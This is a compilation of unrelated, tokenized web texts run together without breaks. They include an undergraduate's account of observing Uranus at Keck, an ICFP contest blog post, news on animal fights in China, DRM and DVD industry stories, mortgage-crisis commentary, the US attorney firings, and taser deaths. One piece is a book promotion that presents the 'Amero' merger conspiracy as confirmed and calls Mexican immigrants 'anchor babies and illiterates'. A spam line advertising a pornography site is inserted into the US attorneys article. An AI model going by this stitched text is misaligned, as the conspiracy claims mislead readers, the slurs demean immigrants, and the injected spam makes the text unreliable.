In lateafternoon , the wispy clouds part .
For the first time I discern the distantdomes , tiny and white , on the peak of blue - grey Mauna Kea , but a heavy cloudhovers above .
Dr. Hammel tells me that once the sun sets , this cloud will cool , sink and wrap the telescopes in its fog , unless – there 's a small possibility – the cloud sinks all the way beneath the summit , down below the telescopes .
Despite the bleak predictions in all the weather forecasts for tonight , I beginto hope that we 'll finally get some data .
I am atKeck Observatory in Hawaii for the Uranian astronomer 's equivalent of Halley 'sComet : ring plane crossing .
It is the last night of the observing run for theteam greeted by the Keck Observatory staff as " the ring plane crossingdudes " : Dr. Imke de Pater of UC Berkeley , Dr. Heidi Hammel of the SpaceScience Institute , Dr. Mark Showalter of the SETI Institute , and me , Dr. Showalter ' ssummer research student , an eager undergraduate who has just finished hersophomore year at Wellesley College .
Earlier this week , as my plane took offfrom Boston , I watched the plane 's shadow on the harbor shrink as we ascended .
The airplane turned and as the wing on my side tilted toward the water , theplane 's shadow collapsed into a line .
This is just what I hope to see in Hawaii , the once - in - forty - two - years geometry of the Uranian ring plane crossing period : asEarth crosses the plane of the Uranian rings , we view the rings edge -on .
Ring planecrossing is a unique time for astronomers to study both the Uranian ringstructure and to detect faint moons usually obscured by the glare of therings .
The three nights we 're observing , September 6th - 8th , are alsoOpposition , when the Earth lies on a straight line between the Sun and Uranus , a particularly good geometry for viewing faint moons .
Small , faint , innerUranian moons are the subject of my research tonight , as I 've spent the summerstudying their chaotic motions .
Their trajectories , though not random , are sosensitive to initial conditions as to be unpredictable .
But the opportunity tostudy the chaotic Uranian satellite system with the 10 - meter Keck II telescopehad been jeopardized by the paradigm system of chaos theory , Earth weather .
Dr. Showalter had originally invited me to observe with him in August , but thattrip was canceled at the last minute due to an approaching hurricane .
Now , during this observing run , we have obtained hardly any data because of fog andhumidity .
Everyone has begun teasing Dr. Showalter because there 's always badweather when he's on the island .
But , we have one more night to attempt anobservation of Uranus during ring plane crossing at Opposition .
As Ianticipate observing Uranus for the first time , I remembered the time Iinitially observed a planet with moons and rings .
At the Whitin Observatory at Wellesley College , on a crisp , clear New England November night , I located the lever in therare red light and pushed it to rotate the creaking dome until Saturn was in theslit .
Using the system of ropes attached to its brass body , I positioned thefifteen foot long , fifteen - thousand pound , one - hundred - and - fifty year oldrefracting telescope , scrambled up a wheeled - staircase , and pressed my eye tothe ice - cold eye piece .
As I turned the knob to focus the lens , Saturn sharpenedinto view , its tiny moons and rings perfect , exquisite and almostunbelievable .
Two yearslater , I am observing the moons and rings of Uranus in an air conditionedcomputer lab under the glare of white fluorescent lights .
Dr. Hammel is talkingto the telescope operator at the summit through a video link , Dr. de Pater istyping commands into the computer that controls an infrared CCD camera attachedto the telescope , and Dr. Showalter is optimistically monitoring the output ofa humidity measurement instrument at the summit .
As we were preparing thatafternoon , a staff member wheeled in a new , modern set of ergonomic leatherchairs intended to make the long hours spent observing more comfortable .
Butthe most amazing modern marvel at Keck Observatory is the adaptive opticssystem .
I wasshocked when Dr. Showalter told me , " Keck beats out Hubble on a lot ofthings now . "
How can observations from Earth even with 10 metertelescope in the thin , dry atmosphere at 14,000 feet possibly be better thanobservations with the Hubble Space Telescope ?
When light enters the atmosphere , it is scattered by our turbulent , chaotic atmosphere , and we see a blurred anddistorted image ; this is why the Hubble Space Telescope , which orbits above theatmosphere , takes such sharp and detailed images .
But , for about five yearsnow , light entering the Keck telescopes has been corrected for atmosphericdistortion by an adaptiveoptics system .
We cannot predict how chaotic atmospheric turbulence willdistort the light , but , with the adaptive optics system , we can measure andcorrect for the distortion a thousand times a second .
Unfortunately , adaptiveoptics cannot fix bad weather .
As we run our preliminary tests the humidity ischanging rapidly , and , when the interesting feature on a test image is blurredout on the real exposure , Dr. Hammel suggests with a sigh , " We could drawit , as astronomers did 200 years ago . "
Around midnighton our last night , as the humidity drops and the air stabilizes , we finallybegin to get some excellent data .
Soon the " seeing " ( a measure of theimage 's blurriness ) is down to 0.39 arc seconds , the best possible seeing onEarth .
" You can never trust the weather predictions , " says Dr. dePater , and I smile to myself because unpredictable weather has given me achance to observe Uranus ' unpredictable moons .
Thirty years ago Uranus ' ringswere discovered during observations from an airplane by detecting a dip instarlight when a star passed behind them ; tonight we resolve the different ring bandsedge - on from Earth .
This night we also observed volcanoes on Jupiter 's moon Io ; and the moon of asteroid ( 45 ) Eugenia , which was discovered in 1999 using theadaptive optics system .
The weatherhas been perfect , so Dr. Showalter is formally absolved of causing HurricaneFlossie in August .
Then the night is over , and as the sun rises I stand outsidethe observing station looking to the south and see the peak of Mauna Kea is once again obscured by clouds .
Suddenly I make the connection between all thechaotic systems that I 've struggled to understand tonight – the weather , theatmospheric turbulence , the Uranian moon motions – and realize that thisexperience was n't once - in - forty - two - years but once - in - an - eon .
Valentine in TomStoppard 's Arcadia marvels that , " A door like this has cracked open fiveor six times since we got up on our hind legs . "
Only recently have wedeveloped the numerical methods and fast computers necessary to understandchaotic systems , systems where , as Valentine says , " the unpredictable and the predetermined unfold together . "
Not only weather , moons , andatmospheric turbulence but most systems in the real world are chaotic : population growth , water dripping from a faucet , the stock market , traffic , thehuman heart .
As the Earth 's orbit passes through the Uranian ring plane , we onEarth are entering a new mathematical and scientific era .
My travelexpenses were generously covered by Wellesley College Astronomy Department 'sWilson - Birney Fund , Massachusetts Space Grant and the National ScienceFoundation , which also funded my summer research at SETI .
For the last five years or so it 's always been my firm intent to take part in the programming contest associated with the International Conference on Functional Programming ( ICFP ) .
And each year something has prevented it .
But this year there was no emergency at work , no computer hardware broke , no sisters were getting married , etc .
So instead of playing poker on the net , which had been consuming all of my free time for the last couple of weeks , I read the 22 page spec and fired up emacs .
( Just kidding , emacs was already running ) .
The surface task was to write an interpreter for a weird string - rewriting language .
The organizers supplied a large blob of data , which when run through the interpreter would produce as output some image drawing operations ( for which you basically had to write some kind of a visualizer if you wanted to achieve anything ) .
The goal was to come up with some prefix to the program which would make it instead produce output that would be as close as possible to a certain target image .
The intended way to achieve that goal was to notice that the drawing operations generated by the blob would first write a clue message , which would then be hidden in the final image by other image operations .
This seems like a really bad decision .
I luckily noticed the message since my first version of the image conversion tool did n't support the flood fill operation .
But apparently a lot of teams never saw the message , and were left to stumble in the dark for the whole weekend .
The image that could be drawn by using the clue would then lead to another obscure puzzle .
Again , I was lucky to figure out the solution after a while , but judging by IRC and mailing list traffic a huge amount of teams never got it , and were basically stuck .
That clue could then finally be used to produce some concrete details on how the big blob of data was using the string - rewriting language to produce the image .
There was even a catalog of the functions that the blob contained .
But the really useful data seemed to be hidden behind yet more puzzles .
So at this point I just did a minimal hack to make a token improvement to the produced image : the source image had a grove of apple trees , the target had pear trees .
And according to the catalog the function apple_tree was exactly as large as pear_tree .
So I wrote a prefix that overwrote the former with the latter .
And then I submitted that prefix , and switched to doing something more interesting .
( I think that token improvement was still in the top 20 something like 8 hours before the contest ended , which probably says something about how much progress people were making ) .
I did rather enjoy writing the interpreter and the visualization tool , and the specifications for both were mostly very good .
Unfortunately the spec contained only a couple of trivial test cases with the expected results , so if your interpreter had a problem , figuring out what exactly was going wrong just from looking at execution traces was really hard .
The organizers originally replied on the mailing list that such debugging " is exactly part of the task " , but later released an example trace from a few iterations at the start .
There was a documented prefix that would run some tests on the implementation , and generate an image from those results , but the coverage of those tests did n't seem to be very good .
( I had several bugs that only showed up with the full image , not with the test one ) .
The part of the interpreter that many teams seemed to have big trouble with was that you could n't really use a basic string or array to represent the program .
If you did , performance would be orders of magnitude too slow ( people were reporting getting 1 iteration / second , when drawing the basic image would require 2 million iterations ) due to excessive copying of strings .
Now , this was even pointed out in the specification !
Paraphrasing : " these two operations needs to run faster than in linear time " .
And still people tried to use strings , bawled when their stupid implementation was n't fast enough , and decided that the only solution would be to rewrite their program in C++ instead of their favourite Haskell / Ocaml / CL .
Good grief ...
For what it 's worth , I used just about the stupidest imaginable implementation strategy beyond just a naive string : represent the program as a linked list of variable length chunks , which will share backing storage when possible .
My first CL implementation of this ran at about 5.5 k iterations / second .
This was good enough at the stage in the competition that I got to , and would 've been easy to optimize further if I 'd decided to continue ( afterwards I made a 15 line change that gave a 8 x speedup , so the basic image now only takes 41 seconds to render on an Athlon x2 3800 + ) .
And this was with a stupid data structure and couple of minor performance hacks .
It seems obvious that practically any language could have been used to write a sufficiently fast interpreter .
It never ceases to amaze me how programmers would rather blame their tools than think about the problem for a couple of minutes .
Anyway , the organizers obviously put in a huge effort for this contest , so thanks to them for that .
It 's just that the format really was n't what I was looking for in a programming contest .
But at least it was interesting enough to temporarily shake me out of playing poker into doing some hacking again :-) ( Faster SBCL hash tables coming soon , I hope ) .
I 've made the source code for the interpreter available since several people have asked for it .
I 'm not sure why they 've asked for it , since it 's not very good code , and probably contains no worthy insights .
But if you want it , it 's there .
Addenda :
After writing the above , I read a few messages on the mailing list which claimed that there really was n't much of a puzzle aspect , but that success was mainly determined by how good tools ( compilers , debuggers , disassemblers , etc ) you were able to write .
While it 's possible that after the initial two humps that I described above the puzzles were irrelevant , that was n't my impression .
At the point where I stopped , it did n't feel to me as if sufficient knowledge was available for writing the tools , but rather was hidden behind encrypted pages , steganography , etc .
None of which I really wanted to deal with .
There was definitely enough information available to make a start at reverse - engineering , but I do n't think there was enough time to reverse - engineer enough of the system to figure out how to write the tools , write them , and then use the tools to actually solve the real problem .
I 'm sure things were different for larger teams , but that does n't really comfort me as a one person team :-)
My impression is that in the earlier ICFP contests the tasks were such that it was possible for a single programmer to achieve a decent result , even if it 's unlikely that it 's good enough to win .
In this case you do n't get any points for the reverse - engineering or for the tools , but just for the end result .
( Having written the above , I 'm now sure that the eventual winner will turn out to be a single programmer who only started working on the task 8 hours before the deadline ) .

The brutal scenes , reminiscent of the bloodthirsty displays in Rome 's colosseum where animals were pitted against one another for the crowd 's amusement , are being played out at a wildlife park in China .
According to officials at Changchung Wildlife Park , staff are training the big cats to kill live prey in order to hone their hunting skills .
But animal rights campaigners questioned the park 's motives and said the practice of feeding goats and calves to caged tigers raised serious welfare concerns .
A spokesman for the RSPCA said : ' We would question the motives behind feeding live animals to tigers in a non-wild environment .
It raises concerns over animal welfare on behalf of the livestock being fed to these tigers .
' Throwing live animals to caged tigers does n't re-create anything that happens in the wild , if that is their aim . '
Tigers are one of the world 's most endangered species , with only 6,000 remaining in the wild .
In the past century alone , three sub -species of tiger has become extinct die to illegal hunting and a continued loss of habitat .
China , which has faced fierce criticism over its animal rights record , is under renewed pressure to improve protection after hosting the so - called Animal Olympics in Shanghai this week .

During the fight , the marsupial appears to reel backwards after receiving a right hook from its human opponent .
The kangaroo was just one of 300 ' athletes ' taking part in the annual event at the Shanghai Wild Animal Park , which also featured an elephant carrying the Olympic torch and various animals - including zebras and mountain goats - put through a series of events such as hurdles and races .
In July , the Daily Mail reported on the barbaric sport of horse fighting where cheering crowds in South West China took bets on which stallion would win a bloody battle .

LOS ANGELES ( Hollywood Reporter ) -
In an industry first , 20th Century Fox is expected to announce Tuesday that the special - edition DVD of “ Live Free or Die Hard ” will come with an electronic copy of the complete movie that can be played on a computer and select portable video players .
“ This may be the killer app , where you have physical media that allows you to have a big - screen experience and at the same time move the file around to other devices and have a great experience there as well , ” said Mike Dunn , worldwide president of 20th Century Fox Home Entertainment , the studio ’s home - video division .
The summer theatrical hit , the fourth in the Bruce Willis “ Die Hard ” franchise and first since 1995 , comes to DVD on November 20 after a box office run that yielded $ 134.4 million in domestic ticket receipts .
The release precedes by nearly a month Warner Home Video ’s “ Harry Potter and the Order of the Phoenix , ” which also will let DVD buyers download a copy of the movie to a PC or portable video device .
The Digital Copy feature also will be included on select other Fox DVDs down the road , though no titles have been announced .
The DRM ( digital rights management ) - free feature allows consumers to transfer the movie file to Windows - based computers or portable video players equipped with Microsoft Windows ’
PlaysForSure feature , available from such manufacturers as Archos , Toshiba , Samsung , RCA , Dell and Creative Labs .
“ The industry has sold nearly 12 billion DVDs to date , and the release of ‘ Live Free or Die Hard ’ is the first one that allows consumers to move their content to other devices , ” Dunn said .
To utilize the Digital Copy feature , consumers can insert Disc 2 of the “ Live Free ” DVD into their computer .
A menu will pop up , offering a choice of either executing the Digital Copy application or launching the DVD special features .
If the Digital Copy application is selected , the computer will verify the proper requirements and ask the user to enter a 16 - digit serial code , found inside the DVD case .
After selecting a destination -- either the computer ’s hard drive or a connected PlaysForSure video player -- the transfer will begin , and the program will be ready for playback after about five minutes .

WASHINGTON , Sept. 9 — As Labor Day weekend got under way , Senator John W. Warner of Virginia revealed his plan to end his political career , after five terms in the Senate , with a quotation from Thomas Jefferson .
“ There is a fullness of time when men should go , ” Mr. Warner , an 80 - year - old Republican , said in a graceful farewell that recalled the very different departure from the Washington stage of another powerful 80 - year - old two years earlier .
Chief Justice William H. Rehnquist died over Labor Day weekend in 2005 , 10 months after receiving a diagnosis of an invariably fatal form of thyroid cancer .
During most of that time , he had been widely expected to announce a decision to retire , but he kept even most colleagues in the dark about his condition and plans until declaring six weeks before his death that he intended to stay on .
Whether he displayed brave optimism or “ a degree of egoistic narcissism , ” as Prof .
Sanford Levinson of the University of Texas Law School asserted in a recent book , is open to debate .
With the protection of life tenure , the decision to play through was , in any event , completely the chief justice ’s own .
Los Angeles , CA ( Oct. 10 , 2007 ) -- Speaking on the Larry King show , former Mexican President Vicente Fox confirmed every assertion made by Jerome Corsi in his new book , NY Times bestseller  The Late Great U.S.A : The Coming Merger with Mexico and Canada ( WND Books , ISBNs 0-9790451 -4-2 , $ 25.95 , July 2007 ) .
Not only did Fox admit that he and George W. Bush have agreed to create a common currency , the Amero , he contended that a North American Union is inevitable .
That s something that Jerry Corsi takes issue with while applauding Foxs openness on national television .
 At last we have public confirmation of the pernicious secret activity that s been going on towards merging Mexico , Canada and the United States ,  declares Corsi , whose book became a bestseller shortly after publication .
 Personally , Id like to thank Vincente Fox .
His candor about this merger is whats going to stop it dead in its tracks . 
Corsi continues ,  Foxs appearance with Larry King and , of all places , on The Daily Show constitutes the first time a leader of Mexico , Canada or the U.S. has openly confirmed a plan to create a regional currency called the Amero -- a plan I document in detail in  The Late Great U.S.A .
Fox went on to explain how current regional trade agreements between the United States and its hopelessly corrupt neighbor to the south are intended to evolve into other previously hidden aspects of North American integration .
As reported in WorldNetDaily , Larry King , near the end of the broadcast , asked Fox a question e-mailed from a listener :  I would like to know how you feel about the possibility of having a Latin America united with one currency ? 
Fox answered in the affirmative , admitting he and George W. Bush had agreed to pursue the Free Trade Agreement of the Americas  a free - trade zone extending throughout the Western Hemisphere  and that part of the plan was to institute a regional currency from Canada to the tip of South America !
 Long term , very long term ,  he said .
 What we proposed together , President Bush and myself , its ALCA , which is a trade union for all the Americas . 
According to Corsi , Fox has indeed performed a public service .
 George W. Bush is president of the United States , not king .
He has utterly no right to enter into any such agreement with a foreign country , particularly a hostile one . 
During Foxs tenure as Mexican president , millions of Mexicans entered the United States illegally .
In Corsis view , this constitutes an invasion that has cost American taxpayers billions of dollars while destroying schools and bankrupting hospitals and municipal governments across the country and is only a taste of what a merger would bring .
 Finally ,  says the author of  The Late Great U.S.A ,  here is unequivocal proof , straight from the mouth of Mexicos former president , that Bushs goal is to erode United States sovereignty in order to create free movement for Mexicos peasant class across our border , in the process flooding us with even more anchor babies and illiterates ready and willing to take advantage of our countrys all - too - generous welfare programs . 
Mexicos invasion of America can and must be stopped , but in order to do so , every citizen must rise up and demand an end to it .
 George W. Bush has been bought lock , stock and barrel by the elite and multi-national corporations pushing for a merger with Mexico , but he has utterly no right under the Constitution to push for a merger of the U.S with Mexico or any other country . 
Foxs comments are part and parcel of Mexicos ongoing campaign to destroy American sovereignty to its benefit .
 Going by what Fox has said on national television , its clear that Mexico has declared war on the United States ,  Corsi asserts .
 It s the only way such words can be interpreted .
Since Bush has no interest in protecting our interests , and since all too few legislators have stepped up to condemn a North American Union and shared currency , its up to we the people . 
Thanks to Corsis book  The Late Great U.S.A ,  more and more patriotic Americans are learning the truth about our good neighbor to the south , the one George W. Bush cant do enough for at the expense of every Americans future .
In just two unguarded interviews , Vincente Fox has confirmed every aspect of the ugly future that Ive laid out in  The Late Great U.S.A . 
It s past time we put a stop to his dream - and George W. Bushs . 

So all the carnage in the mortgage market thus far has come even before the bulk of mortgages have reset .
“ The worst is not over in the subprime mortgage market , ” analysts at JPMorgan recently wrote to the firm ’s clients .
“ The reason for our pessimism is that loans originated in late 2005 and all of 2006 , the period that saw peak origination volumes and sharply decreased underwriting quality , are only now starting to reset in large numbers . ”
It is n’t hard to figure out what will happen when buyers who were already stretching to afford a house are faced with suddenly higher payments .
Many will manage .
They will cut back on other spending , or they will refinance their mortgage and get a new one they can afford .
Others , like the buyer I interviewed two years ago , probably planned all along on selling their homes after a few years .
For them , the artificially low initial rate was a no-lose proposition .
But there are also likely to be a shocking number of people who lose their homes .
From 1994 to 2005 , some 3.2 million households were able to buy homes thanks to subprime mortgages or other such loans , according to an analysis by Moody ’s Economy.com .
About 1.7 million of them will probably lose their homes to foreclosure when all is said and done .
More than half of the homeownership gains from subprime mortgages will be erased .
The flood of those homes onto the market will further depress house prices .
So will the newfound conservatism of mortgage lenders , which will make it harder for tomorrow ’s buyers to get a mortgage .
( Thank goodness . )
The S.& P. / Case - Shiller index of home prices covering 10 major cities has fallen about 3 percent since its peak last summer .
Two or three years from now , JPMorgan predicts , the index will have fallen 15 to 20 percent .
Adjusting for inflation , the decline will be worse .
The big unknown is whether the housing bust will cause a recession or a bear market .
Most people who have looked closely at the mortgage market argue that the answer is no and that the damage will be contained .
Subprime loans still make up a distinct minority of the mortgage market .
Over all , only 3.4 percent of mortgage holders are currently behind on their payments .
And as Victoria Averbukh , a former mortgage analyst at Deutsche Bank now teaching at Cornell , points out , “ The housing market is still a limited portion of the U.S. economy . ”
Consumer spending has slowed recently , but is still fairly strong .
Corporate balance sheets and the job market seem fine .
Rationally , the argument for optimism is pretty compelling : the economy ’s strengths do look big enough to overcome its weaknesses .
Yet even many of the optimists confess to an uncomfortable amount of uncertainty .
There has never been a real estate bubble like the one of the last decade .
So it ’s impossible to know what the bust will bring , especially when there are still so many mortgages that are about to get a lot more expensive .
Amazon 's Tuesday launch of a DRM - free music store with some 2 million tracks represents the music industry 's clearest repudiation yet of the elaborate copy - protection schemes it once staked its future on .
And though it may not be obvious at first , it 's Apple we have to thank .
Along with thousands of independent labels , major music producers Universal Music Group and EMI have signed on to sell songs on Amazon 's new service , representing half of the " Big Four " music publishers .
True , both Universal and EMI had already experimented with DRM - free downloads , but there are signs that the rest of the industry will soon follow .
Edgar Bronfman , Jr. , the Warner Music Group chairman , told Goldman Sachs investors in New York last week he was considering removing DRM from Warner 's music downloads – this just months after suggesting Warner would never abandon DRM .
He blamed Apple for the apparent change of heart .
" We need some online competition " for Apple 's iTunes Music Store , Bronfman said .
He conceded the iPod is " the default device " and iTunes the " download model . "
DRM – digital rights management – allows downloads to expire , or to be shared and played only a limited number of times or on certain devices .
The self - created headache for the industry is that the highly popular iPod and new iPhone only play music protected by Apple 's proprietary FairPlay DRM solution or music that is n't protected at all .
And Apple chairman Steve Jobs has repeatedly balked at licensing FairPlay for use on competing download services or devices .
That meant music companies had to choose between using iTunes or going DRM - free .
The industry stood by and allowed most of its music - download sales to come from Apple .
Recognizing opportunities lost to Apple 's dominance , the music industry is moving toward throwing DRM overboard in a bid to open up new retail markets and promotional opportunities .
" As a consumer , when you buy a slice of bread you want to know you could put it in any toaster , " said Jeanne Meyer , a vice president at EMI , in an interview ahead of the Amazon announcement .
Phil Leigh , an analyst with Inside Digital Media , put the industry 's predicament in layman 's terms .
" As long as the iPod is dominant , they 're going to have to reconcile themselves with dealing with what the consumer wants : something that will play on the iPod , " Leigh said .
" The smartest thing they can do is sell music without DRM .
It 's not as though DRM is stopping pirating in other ways , anyway . "
The irony of the industry 's predicament was not lost on Steve Jobs , Apple 's chairman .
Jobs described the industry 's sagging business model as self - created by EMI , Sony BMG , Universal Music Group and Warner Music Group , the so - called " Big Four " leaders of sales and label ownership , with control of 70 percent of the world 's music distribution market .
" When Apple approached these companies to license their music to distribute legally over the internet , they were extremely cautious and required Apple to protect their music from being illegally copied , " Jobs wrote Feb. 6 in a letter posted on the Cupertino company 's website .
" The solution was to create a DRM system , which envelopes each song purchased from the iTunes store in special and secret software so that it cannot be played on unauthorized devices . "
Apple announced Sept. 10 that it had sold 1 million iPhones , 74 days after their June 29 debut .
More than 100 million iPods have sold since the 2001 launch of the device , and more than 3 billion songs have been purchased from its iTunes Music Store following its 2003 inception .
The Microsoft Zune , by contrast , has sold more than a million units since its Nov. 14 debut in the United States , and it does not play iTunes DRM - restricted music .
Warner 's Bronfman told investors that one problem for his industry is that consumers are more loyal to the iPod than to any particular artist .
That means the industry 's content must play on an Apple device .
" Never before in the history of content has the hardware been more valuable than the software , " Bronfman said .
" You think about the VCR or the video cassette – the video cassette always had more value than the VCR that you shoved it into .
Apple has been able to turn that model on its head . "
Bronfman stopped short of committing Warner to selling DRM - free downloads .
A Warner representative did not return messages seeking comment .
A representative for Sony BMG declined comment .
With DRM headed for the dustbin , all eyes are now on Amazon.com .
The online retail giant says it will sell only DRM - free downloads .
An Amazon insider , who spoke on condition of anonymity , said Amazon was lobbying Sony BMG and Warner to free up their music in a bid to help it compete with Apple .
Universal , EMI and industry insiders speak of the move away from DRM in terms of consumer empowerment or , in the words of Universal 's Peter LoFrumento , " giving consumers what they want . "
David Pakman , chief executive officer of eMusic , the world 's second - largest online downloading site ( in terms of number of downloads ) , says Apple 's stronghold , not consumer choice , is the reason why Sony and Warner will follow their competitors and soon remove DRM from individual downloads .
" They need to have a lot of successful retailers or they wo n't have a growing market , " Pakman said .
" You can't satisfy consumers if there is only one place to buy music .
In every industry , you see market growth when there are lots of different places to buy the product . "
Even if DRM 's days are numbered , that does n't mean the music industry is abandoning technological weapons in combating piracy .
Amazon confirmed Tuesday that some of its music downloads contain digital watermarks identifying Amazon as the source of the music .
Watermarking allows companies to silently brand music files with identifying information , such as customer - and vendor - identification numbers , digitally woven into the fabric of the song .
Those hidden patterns allow music companies to track the origins of music that show up on peer - to - peer sharing sites .
Unlike DRM , watermarks do n't restrict listeners ' legal rights to make backup copies or lend music to friends , as do DRM schemes .
But watermarks can raise privacy and liability concerns , because a person could be charged for copyright violations if the music appears on file - sharing networks , even if the consumer did not put it there .
Of the two major labels participating in Amazon 's music - download service , Universal Music Group uses watermarks , and EMI – for now – does n't .
Universal spokesman Peter LoFrumento said the company will not embed a music buyer 's identity into an MP3 file .
Instead , Universal 's watermark will encode where and when the download was purchased .
He said that would allow the company to study the relationship between lawfully purchased music and online file - sharing sites .
" This is just a trial , " LoFrumento said .
EMI 's music is , at the moment , the most unshackled .
The company offers DRM - free downloads through Apple , Wal - Mart and the new Amazon service , and says it has no plans to add watermarking .
" We do n't have current plans to do that – watermarking , " said EMI 's Meyer .
" The whole point of what we 're doing is , we want to give a seamless experience so consumers can buy music from anybody and play it on any range of devices . "

Pict Earth has the Black Rock City image in place in the Black Rock Desert .
I 've never used them before and it's a little clunkier than Google Earth , but it has some more current images in some places than Google does .

BB reader William Harmon points us to an interesting similarity …
The jpg of the burning man site reminded me of the early paleolithic site in Louisianna called Poverty Point .
The site layout is stikingly similar .
Most Americans are completley unaware of the massive earthen works associated with the archeology of the US .
Wired Editor in Chief Chris Anderson says ,
It ’s easy to dismiss the fact that a few U.S. Attorneys were dismissed in the middle of the Bush Presidency .
After all , they do serve , to some extent , at the pleasure of the President and it is common for each incoming President to ask for the resignation of every sitting U.S. Attorney .
So , why does this story matter ?
For an answer , all we need to do is check out the internal White House emails released yesterday :
WASHINGTON , March 13 – Late in the afternoon on Dec. 4 , a deputy to Harriet E. Miers , then the White House counsel and one of President Bush ’s most trusted aides , sent a two - line e-mail message to a top Justice Department aide .
“ We ’re a go , ” it said , approving a long - brewing plan to remove seven federal prosecutors considered weak or not team players .
The message , from William K. Kelley of the White House counsel ’s office to D. Kyle Sampson , the chief of staff to Attorney General Alberto R. Gonzales , put in motion a plan to fire United States attorneys that had been hatched 22 months earlier by Ms. Miers .
Three days later , the seven prosecutors were summarily dismissed .
An eighth had been forced out in the summer .
(…)
While the target list of prosecutors was shaped and shifted , officials at the Justice Department and the White House , members of Congress and even an important Republican lawyer and lobbyist in New Mexico were raising various concerns .
In rating the prosecutors , Mr. Sampson factored in whether they “ exhibited loyalty to the president and attorney general , ” according to documents released by the Justice Department .
In one e-mail message , Mr. Sampson questioned a colleague about the record of the federal prosecutor in San Diego , Carol C. Lam .
Referring to the office of the deputy attorney general , Mr. Sampson wrote : “ Has ODAG ever called Carol Lam and woodshedded her re immigration enforcement ?
Has anyone ? ” Ms. Lam was one of the seven fired prosecutors .
Two others , Paul K. Charlton in Arizona and Daniel K. Bogden in Nevada , were faulted as being “ unwilling to take good cases we have presented to them , ” according to another e-mail message to Mr. Sampson , referring to pornography prosecutions .
These pornography prosecutions are n’t regarding adult pornography like you find on teen tuber xxx as it ’s legal in the USA , it ’s child pornography prosecutions there are actually referring to .
Another United States attorney , David C. Iglesias of New Mexico , was added to the hit list in the fall of 2006 after criticism from his home state , including a demand by Senator Pete V. Domenici , a Republican , to meet with the attorney general to discuss the performance of Mr. Iglesias ’s office .
And there , you see , is the problem .
By emphasizing loyalty to the President and Attorney General , and adherence to an ideological view of prosecutions , the Justice Department was attempting to politicize the U.S. Attorney ’s office in a way that it had not been in the past .
While the office itself is clearly a political appointment , prosecutors have traditionally been isolated from political pressure of the kind that Miers and Gonzalez were attempting to apply here .
Prosecutors have also enjoyed no small degree of discretion over the cases they handle , and it ’s fairly clear that the Department of Justice was trying to consolidate that authority in Washington by making it clear that certain types of cases ( i.e. , the pornography prosecutions noted above ) should be given priority over others .
So , in short , the reason this matters is because it appears that the Bush Administration was trying to put political pressure on U.S. Attorneys across the nation by punishing those that did n’t follow the party line .

Bush taps birth control critic to head family planning programming Jason Rhyne
Published : Wednesday October 17 , 2007
del.icio.us
Print This Email This President Bush 's choice for heading family planning programming within the Department of Health and Human Services is a critic of birth control .
" Susan Orr , most recently an associate commissioner in the Administration for Children and Families , was appointed Monday to be acting deputy assistant secretary for population affairs , " reports the Washington Post .
" She will oversee $ 283 million in annual grants to provide low - income families and others with contraceptive services , counseling and preventive screenings . "
Orr was quoted in a 2001 article in the Post as supporting a Bush proposal to end a requirement that health insurance plans for federal employees contain coverage for birth control .
" We 're quite pleased , " she said about the plan at the time , " because fertility is not a disease . "
" It s not a medical necessity that you have it , " Orr said of contraception .
She is also a former senior director with the Family Research Council , a conservative organization promoting abstinence education programs and standing against federal funding for contraception .
Eric Keroack , who previously held the post before his resignation in March , similarly opposed contraceptive options , calling them " demeaning to women . "
He was the head of A Woman 's Concern , a Christian pregnancy - counseling group which also favors abstinence as a primary birth control method .
" We have another appointment that just truly politicizes family planning , " the president of the National Family Planning and Reproductive Health Association , Mary Jane Gallagher , told the Post .
" The last time I looked , both Republicans and Democrats used contraception in America . "
A spokesman for the Department of Health and Human Services , however , told the Wall Street Journal that Orr was supportive of Bush 's policies of providing " safe and effective products and services " and that allow for a " freedom of conscience and freedom of choice . "
Anand Parekh , the acting deputy assistant secretary for health , praised Orr for her previous work at the Department .
" She has been responsible for working with State and local agencies to develop programs that focus on preventing the abuse of children in troubled families , protecting children from abuse , and finding permanent placements for those who cannot safely return to their homes ,  Parekh told the Journal .
Orr 's appointment does not require confirmation from the Senate .

Including 10 TASER - related deaths through mid-February of this year , at least 152 people have died in the United States since June 2001 after being shocked with the weapons ....
TASERs are powerful electro - shock weapons in use in more than 7,000 of the 18,000 law enforcement agencies in the United States .
They are designed to incapacitate by conducting 50,000 volts of electricity into an individual 's body .
The electrical pulses induce skeletal muscle spasms that immobilize and incapacitate the individual , causing them to fall to the ground .
It 's not just students who get tasered , by the way ( although here 's a link to another typical incident ) .
AI has expressed its grave concern over police using tasers on vulnerable groups such as senior citizens , pregnant women and children .
Here 's a video of police at Los Angeles International Airport repeatedly tasering an unarmed elderly man .
Notice the fearful reaction of the girls in the background .
Just as disturbing , but with sound , is this YouTube video of a completely unprovoked tasering of a young woman at an antiwar demonstration :
A protester , who was tasered by police at a demonstration called by steelworkers against Jeb Bush in Pittsburg last year , described to Amy Goodman what it feels like to get " tasered " :
AMY GOODMAN : When you say tasered , explain exactly what happened and what that means .
PROTESTER : Well , a taser is different than a stun gun .
They keep saying it was a stun gun .
But a taser , it 's like a yellow or black gun-looking thing .
It 's plastic .
It shoots out two wires that have barbs on the end that hook into your skin , and then it fires electrical charges into you .
I did n't get hit with the full voltage [ inaudible ] dropped the full - voltage cartridge , but essentially when you get hit with a taser , every muscle in your body bunches up , and you can't control your movements at all .
So when I got pulled back , the taser came out of my body , which allowed me to regain my balance and keep moving .
But the effects of that are pretty long - lasting .
You know , I was hazy and could n't concentrate on anything for about a day and like my whole body hurts now , and things like that .
It 's a pretty vicious weapon .
People have died because of it .
Meanwhile , even today , CNN reports on the spread of taser use to the U.S. Forestry Service :
TASER International , Inc. ( Nasdaq : TASR ) , a market leader in advanced electronic control devices , today announced that it received an order from the United States Forest Service for 700 TASER ( r ) X26 electronic control devices and related accessories .
" We are excited about this new additional federal agency purchasing TASER technology to protect life , " said Tom Smith , Chairman and Founder of TASER international .
" Traditionally , we have focused law enforcement sales at the local and state level , but we are now seeing acceptance of TASER technology at various federal law enforcement agencies . "
" We have seen a continual marked increase in TASER technology purchases at the federal level following our initial U.S. military approval of a five - year indefinite delivery indefinite quantity ( IDIQ ) contract .
We are proud that law enforcement within the Departments of Defense , Justice , Homeland Security , Interior , and Agriculture are now relying on TASER devices to protect life . "
The Department of Agriculture now arms its police -- who knew they even had police ?? -- with tasers !
Tasers , Free Speech , and False Proprieties
What 's maybe most disturbing is the support for police state tactics by many in this country .
Blogs and YouTube comments are filled with invective aimed at UF student Andrew Meyer , and with words of support for the police .
